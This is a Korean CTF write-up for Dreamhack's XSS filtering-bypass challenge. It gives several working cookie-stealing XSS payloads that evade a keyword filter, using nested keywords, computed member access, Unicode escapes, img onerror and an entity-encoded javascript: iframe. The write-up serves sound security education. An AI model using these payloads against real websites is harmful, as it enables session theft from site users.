# Challenge: dreamhack - XSS-Filtering-Bypass

## 문제 설명 & 접근
https://dreamhack.io/wargame/challenges/433/
이전 XSS 문제와 코드가 유사하다. 단, 필터링 기능이 들어있다.


## 추가 학습
### 자바스크립트 Computed Member Access 지원 악용
Computed Member Access는 자바스크립트에서 객체의 속성에 대괄호를 사용해 동적으로 접근하는 방식이다. 점(.) 대신 대괄호로 접근하면 내부 표현식을 계산해서 그 값으로 속성에 접근 가능하다. 아래 풀이에서 다루지만 location을 document['locatio'+'n']으로 대체할 수 있다.

```javascript
window["al" + "ert"]("XSS");
```
```javascript
const evil = "constructor";
Boolean[evil]("alert(1)")();  
```

- alert를 window[’al’+’ert’]로 우회 가능 ⇒ 참고로 window는 self와 this로 다시 우회가 가능하다.



### 자바스크립트의 Unicode escape sequence 지원 악용
Unicode escape sequence : 자바스크립트에서 문자열이나 식별자 내부에 유니코드 문자를 표현하기 위해 사용하는 특수한 표기법 ⇒ **어떤 문자를 직접 쓰지 않아도 유니코드 코드 값으로 표현할 수 있다**
*  \uXXXX로 사용할 수 있다. XXXX는 16진수 4자리

    ```javascript
    console.log("\u0061")        // a
    console.log("\u0061\u0062")  // ab
    console.log("\u{1F600}")     // 😀
    ```
* 이를 통해 XSS를 우회할 수 있다. 서버 코드인 re.findall(r'alert|script|document|cookie', content) 는 아래 입력을 필터링하지 못한다.

    ```javascript
    \u0061\u006c\u0065\u0072\u0074(document.cookie)   // alert(document.cookie)
    ```
* 참고 - 자바스크립트 실행 과정
    1. 자바스크립트 코드가 로드 : HTML 문서 안 ```<script>``` 태그 안에 작성된 자바스크립트 코드가 브라우저 엔진에 의해 불러와진다. 외부 .js 파일이면 네트워크로 스크립트 가져와서 문자열 형태로 메모리에 저장
    2. 자바스크립트 엔진의 코드 파싱 : 브라우저 내부의 자바스크립트 엔진이 코드를 하나의 문자열로 읽어 들인 후, 이를 문법 구조에 따라 나눠서 처리 (토큰 단위). 이 시점에 Unicode escape sequence 같은 표현도 실제 문자로 치환된다.
    3. AST 생성 : 파싱된 토큰 기반으로, 자바스크립트 엔진은 코드 구조를 나타내는 AST를 만든다.
    4. 중간 표현으로 변환 : 엔진은 최적화를 위해 중간 코드 형태(IR, 바이트코드 등)으로 변환
    5. 실행


## 문제 풀이
step 1 - 필터링 확인
* app.py의 필터링 기능부터 확인하자. filter는 script, on. javascript 키워드가 있으면 대소문자 구분없이 원본 텍스트에서 제거한다.
    ```python
    def xss_filter(text):
        _filter = ["script", "on", "javascript:"]
        for f in _filter:
            if f in text.lower():
                text = text.replace(f, "")
        return text
    ```
step 2 - 우회 방법
* 굉장히 다양한 풀이가 있을 것이다. 우선 xss1 문제에서 사용한 공격코드를 가져와보자. 이 코드는 script와 location에서 필터링에 걸리면서 차단된다. location에 on이 들어가있어 마찬가지로 차단된다.
    ```javascript
    <script>location.href = "/memo?memo=" + document.cookie;</script>
    ```
    * 이 논리를 사용하되 필터링에 안 걸릴 방법은 어떤 것이 있을까? 가장 간단한 방법은 필터링이 될 때 해당 키워드를 ""로 대체해버리는 xss_filter 로직을 악용하는 것이다. 태그를 ```<scrscriptipt> ```와 같이 바꾼다면 필터링할 때 script 부분이 제거되므로 다시 script 태그가 만들어진다. 유사하게 location 부분도 locatioonn으로 수정해 폼에 입력해주면 무사히 우회 가능하다.
    * xss_filter 로직에 의존하지 않고 키워드만 우회하게끔 하는 방법은 없을까? location을 다르게 표현해보자. location은 document["location"]으로 문자열 키를 이용해 접근할 수 있다는 점을 이용하자. Computed Member Access를 이용해 location을 나눠버릴 수도 있다.
        ```javascript
        <scrscriptipt>document['locatio'+'n'].href = "/memo?memo=" + document.cookie;</scrscriptipt>
        ```
    * 다른 방법은 없을까? 한번 자바스크립트의 Unicode Escape Sequence를 이용해보자. 다음은 Unicode Escape Sequence를 적용해 /flag의 폼 부분에 여러 입력값을 넣은 결과들이다.
        ```javascript
        <scronipt>document['locatio'+'n'].href = "/memo?memo=" + "\u006f";</scronipt> // o가 memo에 출력
        <scronipt>document['locatio'+'n'].href = "/memo?memo=" + "\\u006f";</scronipt> // \u006f가 memo에 출력
        <scronipt>locati\u006fn.href = "/memo?memo=" + "\u006f";</scronipt> // o가 memo에 출력

        ```
    location 부분의 일부를 유니코드로 변환해 넣어도 우회 가능하다. 단, 이는 자바스크립트 내부에서 가능하므로 태그인 script 부분을 수정하는 것은 불가하다.

* 태그를 아예 script를 쓰지 않는 방법도 있다. xss2에서 사용한 익스플로잇을 가져오자. 존재하지 않는 이미지 경로인 src="false"를 지정해 의도적으로 실패시키고 onerror로 location.href로 현재 페이지 쿠키를 읽어 /memo로 전송하는 의미이다. 이 코드에서도 onerror 부분과 location 부분을 수정해주면 된다.
    ```javascript
    <img src="false" oonnerror="locatioonn.href='/memo?memo='+document.cookie">
    ```
* iframe을 쓸 수도 있다. iframe src="javascript:location.href=~~~">의 익스플로잇을 하자.
    * 주의할 점은 javascript를 우회하겠다고 아래와 같이 Unicode Escape Sequence를 써서는 안된다는 것이다.
        ```javascript
        <iframe src="java\u0073cript:locati\u006fn.href='/memo?memo='+d\u006fcument.cookie;">
        ```
    * location이나 document가 javascript 실행 컨텍스트 안에서 등장하므로 괜찮지만 javascript:는 그렇지 않다. src="..."는 속성값(URL)이고 HTML 파서가 여기서 HTML entity인 &#x73;를 디코딩한다. 디코딩하고 값이 javascript:가 되면 브라우저는 이를 프로토콜로 인식하고 나머지를 JS 파서에 넘겨 실행한다. 따라서 javascript 부분은 Unicode가 아니라 HTML Entity Encoding으로 우회하는 것이 좋다. 아래 코드를 쓰면 동작한다.
        ```
        <iframe src="java&#x73;cript:locati\u006fn.href='/memo?memo='+d\u006fcument.cookie;">
        ```


## 시행착오
* html entity encoding을 태그에 이용해보고자 했다. 태그 부분 s를 html entity encoding으로 수정해 접근했지만 정상 수행이 되지 않았다. 플래그 출력이 검증된 익스플로잇 코드를 "<" 부분만 바꿔서 한번 더 진행해봤지만, 역시 플래그는 출력되지 않는다. 
    ```javascript
    &lt;scronipt>locati\u006fn.href = "/memo?memo=" + document.cookie;</scronipt>
    ```
* 디버깅해보니 이 값 그대로 서버에서 xss_filter까지 거치는 것을 알 수 있다. 해당 내용을 폼에 입력해서 /vuln에서 return되는 값은 ```&lt;script>locati\u006fn.href = "/memo?memo=" + document.cookie;</script>```로 그대로이다. 태그 이름을 HTML Encoding해도 HTML 파서가 디코딩하지 않으므로 ```<script>```가 만들어지지 않는 것이다.

## 결과
위에서 다룬 풀이들 중 하나를 택해 폼에 입력하면 /memo에 플래그가 출력된다.


